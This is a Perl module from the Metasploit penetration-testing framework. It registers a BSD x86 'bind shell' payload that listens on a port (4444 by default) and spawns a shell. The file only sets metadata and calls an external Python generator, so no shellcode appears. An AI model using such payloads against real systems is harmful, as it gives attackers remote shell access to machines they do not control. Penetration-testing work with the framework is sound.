package Msf::Payload::bsdx86_bind_ie;
use strict;
use base 'Msf::PayloadComponent::ExternalPayload';
sub load {
  Msf::PayloadComponent::ExternalPayload->import('Msf::PayloadComponent::BindConnection');
}

my $info =
{
  'Name'         => 'bsdx86bind_ie',
  'Version'      => '1.0',
  'Description'  => 'Listen for connection and spawn a shell',
  'Authors'      => [ 'gera[at]corest.com [InlineEgg License]', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'bsd' ],
  'Multistage'   => 0,
  'Size'         => 0,
};

sub new {
  load();
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info}, @_);
  $self->{'Filename'} = $self->ScriptBase . '/payloads/external/bsdx86bind_ie.py';
  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate({'LPORT' => '4444',});
  return length($bin);
}
